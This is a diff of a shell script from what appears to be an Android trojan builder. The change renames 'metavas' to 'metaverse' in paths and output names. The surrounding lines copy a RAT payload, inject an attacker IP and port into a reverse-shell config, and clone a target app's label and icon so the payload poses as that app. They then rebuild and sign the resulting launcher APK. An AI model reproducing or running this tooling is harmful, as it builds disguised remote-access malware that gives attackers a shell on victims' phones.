@@ -84,7 +84,7 @@ java -jar "$TOOLS_DIR/signapk/signapk.jar" "$PEM" "$PK8" "$TMP_DIR/target_hidden
 ## NOW , OUR PAYLOAD TIME!!!!!!!!!
 
 LOG "- Preparing Payload..."
-cp -r "$SRC_DIR/metavas/rat" "$TMP_DIR/payload"
+cp -r "$SRC_DIR/metaverse/rat" "$TMP_DIR/payload"
 
 # Inject IP and Port into Config
 sed -i "s/IP_PLACEHOLDER/$IP/g" "$TMP_DIR/payload/smali/com/example/reverseshell2/config.smali"
@@ -96,7 +96,7 @@ sed -i "s/ACT_PLACEHOLDER/$MAIN_ACTIVITY/g" "$TMP_DIR/payload/smali/com/example/
 LOG --indent 1 "- Cloning target app resources..."
 
 
-cat <<EOF > "$TMP_DIR/payload/res/values/metavas.xml"
+cat <<EOF > "$TMP_DIR/payload/res/values/metaverse.xml"
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="cloned_app_label">$LABEL</string>
@@ -118,7 +118,7 @@ else
     LOGE "Could not find target icon file, using default..."
 fi
 
-LOG --indent 2 "Building MetaVas..."
+LOG --indent 2 "Building MetaVerse..."
 
 if ! java -jar "$TOOLS_DIR/apktool/apktool.jar" \
     b -j "$(nproc)" \
@@ -133,7 +133,7 @@ if ! java -jar "$TOOLS_DIR/signapk/signapk.jar" \
     "$PEM" \
     "$PK8" \
     "$TMP_DIR/payload_unsigned.apk" \
-    "$OUT_DIR/metavas_launcher.apk" > /dev/null; then
+    "$OUT_DIR/metaverse_launcher.apk" > /dev/null; then
 
     LOGE "Failed to sign payload APK"
     exit 1
